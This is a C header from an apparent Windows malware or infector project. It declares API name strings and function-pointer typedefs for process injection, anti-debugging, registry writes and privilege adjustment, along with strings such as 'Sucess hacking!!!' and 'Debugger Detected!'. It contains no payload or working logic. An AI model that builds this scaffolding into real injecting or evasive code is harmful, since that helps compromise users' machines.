#pragma once 
#include <Windows.h>
// #include <winternl.h>


const char * aCreateFileA  = "CreateFileA";
const char * aCreateFileMappingA  = "CreateFileMappingA";
const char * aMapViewOfFile  = "MapViewOfFile";
const char * aCloseHandle  = "CloseHandle";
const char * aUnmapViewOfFile  = "UnmapViewOfFile";
const char * aGetProcAddress  = "GetProcAddress";
const char * aUser32dll  = "user32.dll";
const char * aGetFileSize  = "GetFileSize";
const char * aGetModuleFileNameA  = "GetModuleFileNameA";
const char * aRtlCopyMemory  = "RtlCopyMemory";
const char * aMessageBoxA  = "MessageBoxA";
const char * aFindFirstFileA  = "FindFirstFileA";
const char * aFindNextFileA  = "FindNextFileA";
const char * aFindClose  = "FindClose";
const char * aLoadLibraryA  = "LoadLibraryA";
const char * aUser32  = "User32.dll";
const char * aNtDlldll  = "NtDll.dll";
wchar_t *aKernel32dll  = L"Kernel32.dll";
const char * aOurGoal  = "Sucess hacking!!!";
const char * aExitProcess  = "ExitProcess";
const char * aNtQueryInformationProcess  = "NtQueryInformationProcess";
const char * aGetCurrentProcess  = "GetCurrentProcess";
const char * aAdvapi32  = "Advapi32.dll";
const char * aRegOpenKeyExA  = "RegOpenKeyExA";
const char * aRegQueryValueExA  = "RegQueryValueExA";
const char * aRegCloseKey  = "RegCloseKey";
const char * aDbgDetected  = "Debugger Detected!";
const char * aVirtualAllocEx = "VirtualAllocEx";
const char * aWriteProcessMemory = "WriteProcessMemory";
const char * aVirtualProtectEx = "VirtualProtectEx";
const char * aCreateRemoteThread = "CreateRemoteThread";
const char * aVirtualProtect = "VirtualProtect";
const char * aVirtualAlloc = "VirtualAlloc";
const char * aCreateThread = "CreateThread";
char *aRegOpenKeyA = "RegOpenKeyA";
const char * aRegSetValueExA = "RegSetValueExA";
const char * aOpenProcess = "OpenProcess";
const char * aRegQueryValueA = "RegQueryValueA";
// const char * aCreateFileMappingA = "CreateFileMappingA";
const char * aMappingName = "Global\\Shaco";
const char * aNtSetInformationProcess = "NtSetInformationProcess";


/////// Pure copy, but there is no point in coding them again as it only declare string and define func pointer (rename ???)
typedef HANDLE(WINAPI * pCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
                                         LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
                                         DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef HANDLE(WINAPI *pCreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
                                                DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow,
                                                LPCSTR lpName);
typedef LPVOID(WINAPI *pMapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh,
                                           DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
typedef BOOL(WINAPI *pUnmapViewOfFile)(LPCVOID lpBaseAddress);
typedef BOOL(WINAPI *pCloseHandle)(HANDLE hObject);

typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef DWORD(WINAPI *pGetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
typedef DWORD(WINAPI *pGetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
typedef void(WINAPI *pRtlCopyMemory)(void *Destination, VOID *Source, size_t Length);

typedef HANDLE(WINAPI *pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *pFindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *pFindClose)(HANDLE hFindFile);
typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR lpLibFileName);
typedef int(WINAPI *pMessageBoxA)(HWND hWnd, LPSTR lpText, LPSTR lpCaption, UINT uType);
typedef VOID(WINAPI *pExitProcess)(UINT uExitCode);
typedef HANDLE(WINAPI *pGetCurrentProcess)();

typedef LSTATUS(WINAPI *pRegOpenKeyExA)(HKEY hKey,
                                        LPCSTR lpSubKey,
                                        DWORD ulOptions,
                                        REGSAM samDesired,
                                        PHKEY phkResult);
typedef LSTATUS(WINAPI *pRegQueryValueExA)(HKEY hKey,
                                            LPCSTR lpValueName,
                                            LPDWORD lpReserved,
                                            LPDWORD lpType,
                                            LPBYTE lpData,
                                            LPDWORD lpcbData);
typedef LSTATUS(WINAPI *pRegCloseKey)(HKEY hKey);
typedef LPVOID(WINAPI* pVirtualAllocEx)( HANDLE hProcess,
                                LPVOID lpAddress,
                                SIZE_T dwSize,
                                DWORD  flAllocationType,
                                DWORD  flProtect);

typedef BOOL (WINAPI *pWriteProcessMemory)( HANDLE  hProcess,
                                LPVOID  lpBaseAddress,
                                LPCVOID lpBuffer,
                                SIZE_T  nSize,
                                SIZE_T  *lpNumberOfBytesWritten);
typedef BOOL (WINAPI *pVirtualProtectEx)(
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect
);
typedef BOOL (WINAPI *pVirtualProtect)(
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect
);
typedef HANDLE (WINAPI *pCreateRemoteThread)(
        HANDLE                       hProcess,
        LPSECURITY_ATTRIBUTES        lpThreadAttributes,
        SIZE_T                       dwStackSize,
        LPTHREAD_START_ROUTINE       lpStartAddress,
        LPVOID                       lpParameter,
        DWORD                        dwCreationFlags,
        LPDWORD                      lpThreadId
);

typedef LPVOID(WINAPI* pVirtualAlloc)(
                                LPVOID lpAddress,
                                SIZE_T dwSize,
                                DWORD  flAllocationType,
                                DWORD  flProtect);
typedef HANDLE (WINAPI *pCreateThread)(
        LPSECURITY_ATTRIBUTES   lpThreadAttributes,
        SIZE_T                  dwStackSize,
        LPTHREAD_START_ROUTINE  lpStartAddress,
        LPVOID                  lpParameter,
        DWORD                   dwCreationFlags,
        LPDWORD                 lpThreadId
);
typedef LSTATUS(WINAPI *pRegOpenKeyA)(
        HKEY   hKey,
        LPCSTR lpSubKey,
        PHKEY  phkResult
);
typedef LSTATUS(WINAPI * pRegSetValueExA)(
        HKEY       hKey,
        LPCSTR     lpValueName,
        DWORD      Reserved,
        DWORD      dwType,
        const BYTE *lpData,
        DWORD      cbData
);
typedef HANDLE(WINAPI *pOpenProcess)(
        DWORD dwDesiredAccess,
        BOOL  bInheritHandle,
        DWORD dwProcessId
);
typedef LSTATUS(WINAPI *pRegQueryValueA)(
        HKEY   hKey,
        LPCSTR lpSubKey,
        LPSTR  lpData,
        PLONG  lpcbData
);
typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
    HANDLE hProcess,
    PROCESS_INFORMATION_CLASS ProcessInformationClass,
    LPVOID ProcessInformation,
    DWORD ProcessInformationSize
);
typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(
    DWORD Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    DWORD* OldStatus
);